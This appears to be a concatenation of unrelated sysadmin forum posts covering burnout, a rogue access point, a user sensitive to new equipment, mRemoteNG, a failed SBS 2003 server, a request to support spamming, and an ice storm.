3. Pressure to take on more risks as your business system demands compliance and to decrease costs but increase “quality”
 
4. Inability to balance personal and professional life
 
5. Decreased company or peer socialization and collegiality
 
6. Lack of positive and timely feedback from management or the owners of the company
 
7. Difficulty in saying “No” (at work, home, church, volunteer activities, or in the community)

Obviously this was set up to steal accounts.

How do we go about finding/stopping this?

Found out it's our own APs broadcasting the pirate signal.  They went down a month ago and came back up 2 days with the zombie network.

Apparently they have a user who gets physically ill (allergy/cold/flu type symptoms) whenever a new piece of equipment is introduced to their surrounding area. 

Recently, the laser printer in their office area died. IT spent money to purchase replacement parts, however they were unable to repair the printer. The cost of time spent, parts, and additional parts required goes beyond the cost of a new printer. They have replaced the printer and now the user is getting sick. 

Carpet in another area of the building was replaced a while back and the user cannot walk on it as it makes them sick, so facilities had to put down throw rugs (cut from the old carpet) that the user can walk on. 

IT can't replace the user's old p4 xp machine because the new workstation makes the user sick.  

Essentially, anything that the user sees / touches / interacts with cannot change or they become ill.   

Luckily, this issue is not my responsibility but it's definitely an odd problem that local IT and facilities people have to work around. Seems to me that the problem is definitely psychological as opposed to being some type of allergy, but I'm not a doctor. 

Eventually it will be come an HR issue, but they're quite sensitive to people's needs at this office so the user will probably retire before that ever happens.

This OSS package gives you a multi-level tabbed window into all of your remote system connections.  Supports SSH1/2, VNC, RDP, ICA, telnet, HTTP/S, and more.  Systems are organized into a folder-based heirachy with selectable inheritance (eg, create a folder for all your connections to servers in a particular domain, set your username/password/domain at the folder level, and have server connections under the folder inherit that info).  

Connections are stored in a local XML file, and sections of your connection file can be easily exported.  I use this in my consulting work - I'll stand up a few dozen servers, get all the connection info into mRemoteNG, then export that set as an XML file and hand it to the customer so they now have an easy way to access the entire platform that I have implemented.  If you work in a team environment, the connections can also be saved into a shared SQL database.

You can [integrate your own management tools](http://forum.mremoteng.org/viewtopic.php?f=3&amp;t=82) as well.

After powering down the server, I unplug the power cords, swap the drive, plug it back in and go to fire it up.... nothing.  

I troubleshoot everything from the wall outlet to the UPS to the power cord to the power supplies.  Both redundant PSs dead.  I was thinking it could be the power control unit or something.  After reading online it sounds like this is an occasional issue and it could be anything from the PS to the motherboard.  Great.  Of course, no spares (small company so no spare redundants).  I'm kinda dead in the water, because there really isn't any spare servers available.  I figure, worst case scenario I'll restore the backups to dissimilar hardware and deal with it.

Did I mention that this server is an SBS 2003 which hosts redirected folders AND Exchange?  Please shoot me.  Moral of the story, having a solid backup is only part of the battle.  You also need a restoration plan!

AD is up (but stale), computers are connected, data drive is in use as a non-redundant external (the horror), network shares are up, redirected folders up.  Exchange is still down.  I'll have to look at getting my hands on the good backup and restoring to either another SBS I have or a virtual machine.  I'll let our techs sweep up the mess in the AM while I try to figure the server out.  Either way put a fork in me, I'm done!  (besides the 1hr drive home :O)

1333039886.0,92,self.sysadmin,rjgb3,I'm being asked to support spamming,110,18,54,http://www.reddit.com/r/sysadmin/comments/rjgb3/im_being_asked_to_support_spamming/,"**Note:** I'm am attempting to convey to this unit that spamming will not work for them, and isn't worth the investment in time or money. I've also explained their requirements under the CAN SPAM act.

This group is attempting to drum up new students for a specific masters program that is just being spun up. The director for this program has decided that the best way to attract interest is to send unsolicited email to known professionals in this industry. To gather a list of addresses, he purchased paper copies of membership directories for a number of professional organizations and had his graduate student copy names and email addresses by hand in to excel. (That poor kid.)

His secretary is in charge of sending out the emails using outlook, and managing the people who opt out. She's discovered that this is a huge task and they are looking for software to help manage it.

I suggested that they use a service rather than try to do it in house, but all of the mass email services I found, including the one currently used by our university, do not allow unsolicited email to be sent which this absolutely would be.

Suggestions? Fight the battle? Services we can use? Surely I'm not the only sysadmin out there who has had to deal with a user attracted to the dark side by the shear volume of ~~victims~~ *potential clients* they can reach.

**TL&amp;DR:** I'm being asked to support spamming. Wat do.

**Edit:** Currently it's only about 2500 addresses. From my quick research, they can expect a 14% open rate (doubtful given who they are contacting) and a %0.2 positive response. So yea, lets get about 5 people in return for blacklisting our university again.

**Edit 2:** ISP TOS: *""**or send unsolicited mass e-mails to more than twenty-five (25) e-mail users if such unsolicited e-mails provoke complaints from recipients**""*

So yea, I'll tell them to pick their top 25 prospects, and they can email them. Case closed.",,False,self,t5_2qnp7,True,,,True,t3_rjgb3,http://www.reddit.com/r/sysadmin/comments/rjgb3/im_being_asked_to_support_spamming/,

The air was still but for a gentle breeze.  The branches of trees stirred with a muted rustle of ice - you rarely _hear_ that.  It looked as if every tree had magically grown ice-colored leaves.

It was a beautiful, magical, moment in time.

Then I came to my senses: the data center was surely running on generator, there were places I needed to be, things to be done.
